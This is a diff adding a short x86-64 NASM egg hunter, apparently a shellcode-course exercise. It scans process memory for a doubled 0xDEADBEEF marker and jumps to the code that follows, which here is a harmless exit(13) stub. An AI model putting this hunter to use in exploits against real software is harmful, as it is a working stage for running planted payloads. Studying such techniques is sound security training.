@@ -1,0 +1,37 @@
+; Filename: EggHunter.nasm
+; Author  : Andrea Perfetti
+; SLAE ID : PA-29059
+
+
+global _start
+
+section .text
+
+_start:
+    xor rsi, rsi
+    xor rdi, rdi
+
+next_page:
+    or di, 0xfff
+    inc rdi
+
+next_addr:
+    xor rax, rax
+    mov al, 21
+    syscall
+
+    cmp al, 0xf2
+    jz next_page
+    mov eax, 0xEFBEADDE
+    scasd
+    jnz next_addr
+
+    scasd
+    jnz next_addr
+
+jmp_to_egg:
+    jmp rdi
+
+
+section .data
+    Shellcode: db 0xDE,0xAD,0xBE,0xEF, 0xDE,0xAD,0xBE,0xEF,  0x90,0x90,0x90,0x90,  0x48,0x31,0xc0,0xb0,0x3c,0x48,0x31,0xff,0x48,0x83,0xc7,0x0d,0x0f,0x05
